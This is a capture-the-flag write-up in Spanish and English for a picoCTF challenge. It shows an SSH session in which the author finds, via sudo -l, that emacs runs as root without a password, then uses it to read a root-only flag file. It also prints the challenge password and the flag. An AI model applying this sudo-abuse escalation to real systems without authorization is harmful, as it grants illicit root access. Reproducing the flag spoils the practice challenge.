#### Descripción 
Can you read the flag? I think you can!
ssh -p 52526 ctf-player@green-hill.picoctf.net using password 430838f7
#### Solución
```
SebAcuna-picoctf@webshell:~$ ssh -p 57634 ctf-player@green-hill.picoctf.net
The authenticity of host '[green-hill.picoctf.net]:57634 ([3.18.205.4]:57634)' can't be established.
ED25519 key fingerprint is SHA256:6yCIZ8GT1zu0g1/pjVc7t+aLNpxCPniM/MF6w7pTUx0.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:12: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[green-hill.picoctf.net]:57634' (ED25519) to the list of known hosts.
ctf-player@green-hill.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.17.0-1009-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

ctf-player@challenge:~$ dir
flag.txt
ctf-player@challenge:~$ ls -l flag.txt
-r--r----- 1 root root 31 Mar  9 21:32 flag.txt
ctf-player@challenge:~$ sudo -l
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/emacs
ctf-player@challenge:~$ sudo /bin/emacs flag.txt

picoCTF{ju57_5ud0_17_c2c0d2e2}
```
#### Notas
En este reto identifiqué que el archivo `flag.txt` tenía permisos restringidos y pertenecía al usuario root, por lo que no podía leerlo directamente. Luego verifiqué mis privilegios con `sudo -l` y descubrí que podía ejecutar GNU Emacs como root sin contraseña. Aproveché este permiso para abrir el archivo con privilegios elevados y obtener la flag, aplicando conceptos de permisos en Linux y escalación de privilegios mediante configuraciones inseguras de sudo.
#### Referencias
